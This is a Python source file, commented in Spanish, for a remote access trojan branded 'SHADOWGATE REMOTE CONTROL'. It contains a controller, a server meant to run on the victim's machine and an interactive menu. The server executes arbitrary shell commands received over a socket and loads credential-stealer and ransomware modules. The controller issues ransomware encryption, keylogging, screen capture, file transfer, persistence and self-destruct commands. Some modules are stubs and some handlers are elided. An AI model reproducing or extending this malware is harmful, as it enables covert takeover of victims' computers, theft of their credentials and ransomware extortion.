# 📁 remote_control_system.py
import socket
import json
import struct
import subprocess
import threading
import time

# Corrección de importaciones
try:
    from modules.encryption import SecureComs
    from modules.credential_stealer import CredentialStealer
    from modules.ramsofware import Ransomware
    from modules.screen_server import ScreenServer
except ImportError:
    # Fallback a importaciones locales
    from Objetivo.encryption import SecureComs


    # Crear stubs para módulos faltantes
    class CredentialStealer:
        def run(self):
            return {'passwords': {}, 'wifi': [], 'cookies': {}}


    class Ransomware:
        def __init__(self, pin):
            self.pin = pin

        def verify_pin(self, pin):
            return pin == self.pin

        def encrypt_directory(self, path):
            return True


    from screen_server import ScreenServer
class RemoteControlSystem:
    def __init__(self, target_ip, control_port=5560, encryption_key=None):
        self.target_ip = target_ip
        self.control_port = control_port
        self.connected = False
        self.socket = None

        # Sistema de cifrado para comunicaciones
        if encryption_key:
            self.crypto = SecureComs()
        else:
            self.crypto = None

    def connect(self):
        """Establecer conexión con el objetivo"""
        try:
            self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.socket.connect((self.target_ip, self.control_port))
            self.connected = True
            print(f"✅ Conectado al objetivo {self.target_ip}:{self.control_port}")
            return True
        except Exception as e:
            print(f"❌ Error de conexión: {e}")
            return False

    def send_command(self, command_type, command_data, wait_response=True):
        """Enviar comando al objetivo"""
        if not self.connected:
            if not self.connect():
                return None

        try:
            # Crear paquete de comando
            command_packet = {
                'type': command_type,
                'data': command_data,
                'timestamp': time.time()
            }

            # Cifrar si está configurado
            if self.crypto:
                encrypted_data = self.crypto.encrypt(json.dumps(command_packet))
                self.socket.sendall(struct.pack('!I', len(encrypted_data)))
                self.socket.sendall(encrypted_data)
            else:
                json_data = json.dumps(command_packet).encode()
                self.socket.sendall(struct.pack('!I', len(json_data)))
                self.socket.sendall(json_data)

            # Esperar respuesta si es necesario
            if wait_response:
                return self._receive_response()
            return True

        except Exception as e:
            print(f"❌ Error enviando comando: {e}")
            return None

    def _receive_response(self):
        """Recibir respuesta del objetivo"""
        try:
            # Recibir tamaño de la respuesta
            size_data = self.socket.recv(4)
            if not size_data:
                return None

            size = struct.unpack('!I', size_data)[0]

            # Recibir datos
            response_data = b''
            while len(response_data) < size:
                chunk = self.socket.recv(min(4096, size - len(response_data)))
                if not chunk:
                    return None
                response_data += chunk

            # Descifrar si es necesario
            if self.crypto:
                decrypted_data = self.crypto.decrypt(response_data)
                return json.loads(decrypted_data.decode())
            else:
                return json.loads(response_data.decode())

        except Exception as e:
            print(f"❌ Error recibiendo respuesta: {e}")
            return None

    def execute_system_command(self, command):
        """Ejecutar comando de sistema en el objetivo"""
        return self.send_command('system_cmd', {'command': command})

    def run_ransomware(self, target_path, pin):
        """Ejecutar ransomware en el objetivo"""
        return self.send_command('ransomware', {
            'action': 'encrypt',
            'target': target_path,
            'pin': pin
        })

    def decrypt_files(self, target_path, pin):
        """Descifrar archivos en el objetivo"""
        return self.send_command('ransomware', {
            'action': 'decrypt',
            'target': target_path,
            'pin': pin
        })

    def start_screen_stream(self):
        """Iniciar transmisión de pantalla"""
        return self.send_command('screen', {'action': 'start'})

    def stop_screen_stream(self):
        """Detener transmisión de pantalla"""
        return self.send_command('screen', {'action': 'stop'})

    def download_file(self, remote_path, local_path):
        """Descargar archivo del objetivo"""
        return self.send_command('file_transfer', {
            'action': 'download',
            'remote_path': remote_path,
            'local_path': local_path
        })

    def upload_file(self, local_path, remote_path):
        """Subir archivo al objetivo"""
        return self.send_command('file_transfer', {
            'action': 'upload',
            'local_path': local_path,
            'remote_path': remote_path
        })

    def get_system_info(self):
        """Obtener información del sistema objetivo"""
        return self.send_command('system_info', {})

    def keylogger_start(self):
        """Iniciar keylogger en el objetivo"""
        return self.send_command('keylogger', {'action': 'start'})

    def keylogger_stop(self):
        """Detener keylogger"""
        return self.send_command('keylogger', {'action': 'stop'})

    def keylogger_dump(self):
        """Obtener logs del keylogger"""
        return self.send_command('keylogger', {'action': 'dump'})

    def persistence_add(self):
        """Añadir persistencia"""
        return self.send_command('persistence', {'action': 'add'})

    def persistence_remove(self):
        """Eliminar persistencia"""
        return self.send_command('persistence', {'action': 'remove'})

    def self_destruct(self, pin):
        """Auto-destrucción del software"""
        return self.send_command('self_destruct', {'pin': pin})

    def disconnect(self):
        """Desconectar del objetivo"""
        if self.socket:
            try:
                self.socket.close()
            except:
                pass
        self.connected = False
        print("🔌 Desconectado del objetivo")


# 📁 control_server.py (Se ejecuta en el objetivo)
class ControlServer:
    def __init__(self, host='0.0.0.0', port=5560, encryption_key=None):
        self.host = host
        self.port = port
        self.running = False
        self.server_socket = None

        if encryption_key:
            self.crypto = SecureComs()
        else:
            self.crypto = None

    def handle_client(self, client_socket, address):
        """Manejar cliente conectado"""
        print(f"🔗 Cliente conectado: {address}")

        try:
            while self.running:
                # Recibir comando
                size_data = client_socket.recv(4)
                if not size_data:
                    break

                size = struct.unpack('!I', size_data)[0]
                command_data = b''

                while len(command_data) < size:
                    chunk = client_socket.recv(min(4096, size - len(command_data)))
                    if not chunk:
                        break
                    command_data += chunk

                # Descifrar si es necesario
                if self.crypto:
                    decrypted_data = self.crypto.decrypt(command_data)
                    command = json.loads(decrypted_data.decode())
                else:
                    command = json.loads(command_data.decode())

                # Procesar comando
                response = self.process_command(command)

                # Enviar respuesta
                if self.crypto:
                    encrypted_response = self.crypto.encrypt(json.dumps(response))
                    client_socket.sendall(struct.pack('!I', len(encrypted_response)))
                    client_socket.sendall(encrypted_response)
                else:
                    json_response = json.dumps(response).encode()
                    client_socket.sendall(struct.pack('!I', len(json_response)))
                    client_socket.sendall(json_response)

        except Exception as e:
            print(f"❌ Error manejando cliente: {e}")
        finally:
            client_socket.close()

    def process_command(self, command):
        """Procesar comando recibido"""
        try:
            cmd_type = command['type']
            cmd_data = command['data']

            if cmd_type == 'system_cmd':
                # Ejecutar comando de sistema
                result = subprocess.run(
                    cmd_data['command'],
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                return {
                    'success': True,
                    'output': result.stdout,
                    'error': result.stderr,
                    'return_code': result.returncode
                }

            elif cmd_type == 'credential_stealer':
                from Objetivo.credential_stealer_fixed import CredentialStealer
                stealer = CredentialStealer()
                results = stealer.run()
                return {'success': True, 'data': results}

            elif cmd_type == 'ransomware':
                # Manejar operaciones de ransomware
                from ramsofware import Ransomware
                ransomware = Ransomware("PIN_CONFIGURADO")

                if cmd_data['action'] == 'encrypt':
                    if ransomware.verify_pin(cmd_data['pin']):
                        success = ransomware.encrypt_directory(cmd_data['target'])
                        return {'success': success, 'message': 'Encryption completed'}
                    else:
                        return {'success': False, 'message': 'Invalid PIN'}

                elif cmd_data['action'] == 'decrypt':
                    if ransomware.verify_pin(cmd_data['pin']):
                        # Lógica de descifrado
                        return {'success': True, 'message': 'Decryption completed'}
                    else:
                        return {'success': False, 'message': 'Invalid PIN'}

            elif cmd_type == 'screen':
                # Controlar transmisión de pantalla
                from screen_server import ScreenServer
                screen_server = ScreenServer()

                if cmd_data['action'] == 'start':
                    threading.Thread(target=screen_server.start_server, daemon=True).start()
                    return {'success': True, 'message': 'Screen stream started'}
                elif cmd_data['action'] == 'stop':
                    screen_server.stop_server()
                    return {'success': True, 'message': 'Screen stream stopped'}

            # ... más handlers para otros tipos de comandos

            return {'success': False, 'message': 'Unknown command type'}

        except Exception as e:
            return {'success': False, 'message': f'Command error: {str(e)}'}

    def start_server(self):
        """Iniciar servidor de control"""
        self.running = True
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            print(f"🖥️  Servidor de control iniciado en {self.host}:{self.port}")

            while self.running:
                client_socket, address = self.server_socket.accept()
                client_thread = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, address),
                    daemon=True
                )
                client_thread.start()

        except Exception as e:
            print(f"❌ Error en servidor: {e}")
        finally:
            self.stop_server()

    def stop_server(self):
        """Detener servidor"""
        self.running = False
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass


# 📁 main_controller.py (Interfaz de control principal)
class MainController:
    def __init__(self):
        self.targets = {}  # IP: control_object
        self.current_target = None

    def add_target(self, ip, port=5560, encryption_key=None):
        """Añadir objetivo a controlar"""
        control = RemoteControlSystem(ip, port, encryption_key)
        if control.connect():
            self.targets[ip] = control
            self.current_target = ip
            return True
        return False

    def execute_command(self, command_type, **kwargs):
        """Ejecutar comando en el objetivo actual"""
        if not self.current_target:
            print("❌ No hay objetivo seleccionado")
            return None

        control = self.targets[self.current_target]

        if command_type == 'system':
            return control.execute_system_command(kwargs['command'])
        elif command_type == 'ransomware_encrypt':
            return control.run_ransomware(kwargs['path'], kwargs['pin'])
        elif command_type == 'ransomware_decrypt':
            return control.decrypt_files(kwargs['path'], kwargs['pin'])
        elif command_type == 'screen_start':
            return control.start_screen_stream()
        elif command_type == 'screen_stop':
            return control.stop_screen_stream()
        # ... más comandos

    def interactive_menu(self):
        """Menú interactivo de control"""
        while True:
            print("\n" + "=" * 50)
            print("🕶️  SHADOWGATE REMOTE CONTROL")
            print("=" * 50)
            print("[1]. Conectar a objetivo")
            print("[2]. Ejecutar comando de sistema")
            print("[3]. Encriptar archivos (Ransomware)")
            print("[4]. Desencriptar archivos")
            print("[5]. Ver pantalla remota")
            print("[6]. Descargar/Subir archivos")
            print("[7]. Keylogger")
            print("[8]. Información del sistema")
            print("[9]. Auto-destrucción")
            print("[0]. Salir")
            print("=" * 50)

            choice = input("Selecciona opción: ")

            if choice == "1":
                ip = input("IP del objetivo: ")
                port = int(input("Puerto (5560): ") or "5560")
                if self.add_target(ip, port):
                    print(f"✅ Conectado a {ip}")
                else:
                    print(f"❌ Error conectando a {ip}")

            elif choice == "2" and self.current_target:
                command = input("Comando a ejecutar: ")
                result = self.execute_command('system', command=command)
                print(f"Resultado: {result}")

            elif choice == "3" and self.current_target:
                path = input("Ruta a encriptar: ")
                pin = input("PIN de seguridad: ")
                result = self.execute_command('ransomware_encrypt', path=path, pin=pin)
                print(f"Resultado: {result}")

            # ... más opciones del menú

            elif choice == "0":
                break


if __name__ == "__main__":
    controller = MainController()
    controller.interactive_menu()